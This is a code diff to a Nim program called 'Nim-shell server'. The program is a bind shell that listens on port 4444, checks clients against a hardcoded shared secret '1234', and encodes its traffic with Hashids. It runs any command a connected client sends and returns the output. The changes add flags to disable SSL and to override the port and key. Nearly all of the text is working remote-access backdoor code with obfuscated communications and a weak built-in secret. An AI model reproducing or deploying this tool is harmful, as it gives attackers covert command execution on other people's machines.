@@ -13,8 +13,8 @@ import argparse
 import hashids
 import std/sha1
 
+const BIND: int = 4444
 const SECRET: string = "1234"
-const SSL: bool = true
 const CERTFILE = "server.pem"
 const KEYFILE = "key.pem"
 const CERT: string = """-----BEGIN CERTIFICATE-----
@@ -159,7 +159,6 @@ proc toString(str: seq[char]): string =
         add(result, ch)
 
 proc encodeMsg(m: string, h: Hashids): string =
-    #let hid: Hashids = createHashids(k & s)
     return h.encode(m.mapIt(it.ord))
 
 proc decodeMsg(m: string, h: Hashids): string =
@@ -176,7 +175,7 @@ proc generateKeys(): KEYCHAIN =
         pubKey: int = calcPublicKey(primitiveRoot, privateKey, primeNumber)
     return KEYCHAIN(private: privateKey, public: pubKey, prime: primeNumber, root: primitiveRoot, sharedKey: SECRET)
 
-proc verifyClient(k: KEYCHAIN, j: string, v: bool): (KEYCHAIN, bool) =
+proc verifyClient(k: KEYCHAIN, j, s: string, v: bool): (KEYCHAIN, bool) =
         var kc = k
         try:
             let 
@@ -185,7 +184,7 @@ proc verifyClient(k: KEYCHAIN, j: string, v: bool): (KEYCHAIN, bool) =
                 clientPubKey: int = dh.pub
                 clientMsg: string = dh.msg
                 secret: int = calcSecretKey(clientPubKey, k.private, k.prime)
-                hids: Hashids = createHashids(SECRET & $secret)
+                hids: Hashids = createHashids(s & $secret)
                 dec = secureHash(encodeMsg("Success", hids))
             
             if $dec == clientMsg:
@@ -195,7 +194,7 @@ proc verifyClient(k: KEYCHAIN, j: string, v: bool): (KEYCHAIN, bool) =
                 kc.clientPublic = clientPubKey
                 kc.sharedSecret = secret
                 kc.hashIds = hids
-
+                
                 return (kc, true)
             else:
                 if v:
@@ -204,17 +203,24 @@ proc verifyClient(k: KEYCHAIN, j: string, v: bool): (KEYCHAIN, bool) =
                 
         except JsonParsingError:
             if v:
-                echo "Server: client json parse error"
+                echo "Server: client json parse error or SSL?"
             return (k, false)
 
-proc main(port: int, ssl, verbose: bool) = 
+proc isNumeric(s: string): bool =
+    try:
+        discard s.parseFloat()
+        result = true
+    except ValueError:
+        result = false
+
+proc main(port: int, secret: string, ssl, verbose: bool) = 
     
     var 
         run = true
         server: Socket = newSocket()
         clients: seq[Socket] = @[]
-        clientsToRemove: seq[int] = @[]
         secrets: seq[KEYCHAIN] = @[]
+        clientsToRemove: seq[int] = @[]
 
     # Start the server and bind to port
     server.setSockOpt(OptReuseAddr, true)
@@ -231,6 +237,7 @@ proc main(port: int, ssl, verbose: bool) =
     if verbose:
         echo "Server: listening on ", port
 
+    
     # Handle client connections
     while run:
         try:
@@ -251,84 +258,113 @@ proc main(port: int, ssl, verbose: bool) =
             client.send($jsonObject & "\r\L")
 
             let recvJson = client.recvLine(timeout = 10)
-            (keychain, isValidated) = verifyClient(keychain, recvJson, verbose)
+            (keychain, isValidated) = verifyClient(keychain, recvJson, secret, verbose)
 
             if isValidated:
+                secrets.add(keychain)
                 clients.add(client)
                 var idMsg: SecureHash = secureHash(encodeMsg("Connected", keychain.hashIds))
                 jsonObject = %* {"msg": $idMsg}
                 client.send($jsonObject & "\r\L")
-
-                secrets.add keychain
-            else:
-                client.close()
         except OSError:
             discard
 
+        # After connected, handle incoming client connections containing commands
         for index, client in clients:
             try:
                 var 
                     keychain: KEYCHAIN
                     command: string = " "
-
-                let raw: string = client.recvLine(timeout = 10)
                     
-                for i, k in secrets:
-                    if index == i:
-                        keychain = k
+                let raw: string = client.recvLine(timeout = 10)
 
-                command = decodeMsg(raw, keychain.hashIds)
-
-                if command == "":
+                if raw == "":
                     clientsToRemove.add(index)
-                elif command == "shutdown":
-                    run = false
-                elif command == "cd" or command == "cd ":
-                    client.send(encodeMsg("Must specify path", keychain.hashIds) & "\r\L\r\L")
-                elif command.startsWith("cd"):
-                    let dir = command.split()[1]
+                else: 
+                    for i, k in secrets:
+                        if index == i:
+                            keychain = k
 
-                    if len(dir) > 0:
+                    # Begin decoding messages
+                    command = decodeMsg(raw, keychain.hashIds)
+
+                    if command == "shutdown":
+                        run = false
+                    elif command == "cd" or command == "cd ":
+                        client.send(encodeMsg("Must specify path", keychain.hashIds) & "\r\L\r\L")
+                    elif command.startsWith("cd"):
+                        let dir = command.split()[1]
+
+                        if len(dir) > 0:
+                            try: 
+                                os.setCurrentDir(dir)
+                                var result = os.getCurrentDir()
+                                client.send(encodeMsg(result, keychain.hashIds) & "\r\L\r\L")
+                            except OSError:
+                                client.send(encodeMsg("Directory doesn't exist!", keychain.hashIds) & "\r\L\r\L")
+                        else:
+                            client.send(encodeMsg("Must specify path", keychain.hashIds) & "\r\L\r\L")
+                    else:
                         try: 
-                            os.setCurrentDir(dir)
-                            var result = os.getCurrentDir()
+                            var result = execProcess(command)
                             client.send(encodeMsg(result, keychain.hashIds) & "\r\L\r\L")
                         except OSError:
-                            client.send(encodeMsg("Directory doesn't exist!", keychain.hashIds) & "\r\L\r\L")
-                    else:
-                        client.send(encodeMsg("Must specify path", keychain.hashIds) & "\r\L\r\L")
-                else:
-                    try: 
-                        var result = execProcess(command)
-                        client.send(encodeMsg(result, keychain.hashIds) & "\r\L\r\L")
-                    except OSError:
-                        discard
+                            discard
 
             except TimeoutError:
                 discard
 
+        # Remove client and secrets when disconnected
         for index in clientsToRemove:
             clients.del(index)
             secrets.del(index)
             if verbose:
                 echo "Server: Client disconnected"
 
+        # Reset list of clients to remove
+        clientsToRemove = @[]
+
     server.close()
     system.quit(0)
 
+# Parse server command line arguments
 var p = newParser:
     help("Nim-shell server")
     flag("-v", "--verbose", help="Enable verbost output for debugging")
-    option("-p", "--port", help="Target port", required=false)
+    flag("-n", "--nossl", help="Disable SSL")
+    option("-p", "--port", help="Override default port", required=false)
+    option("-k", "--key", help="Override default shared secret", required=false)
     
 try: 
-    var x = p.parse(commandLineParams())
+    var 
+        x = p.parse(commandLineParams())
+        useSSL: bool = true
+        usePort: int = BIND
+        useKey: string = SECRET
 
-    if SSL:
-        writeFile("server.pem", CERT)
-        writeFile("key.pem", KEY)
+    if x.nossl:
+        if x.verbose:
+            echo "Client: SSL disabled"
+        useSSL = false
+    else:
+        writeFile(CERTFILE, CERT)
+        writeFile(KEYFILE, KEY)
+
+    if x.port_opt.isNone:
+        discard
+    else:
+        if isNumeric(x.port):
+            usePort = parseInt(x.port)
+        else:
+            echo "Client: invalid port"
+            quit(1)
     
-    main(parseInt(x.port), SSL, x.verbose)
+    if x.key_opt.isNone:
+        discard
+    else:
+        useKey = x.key
+    
+    main(usePort, useKey, useSSL, x.verbose)
 except ShortCircuit as e:
     if e.flag == "argparse_help":
         echo p.help
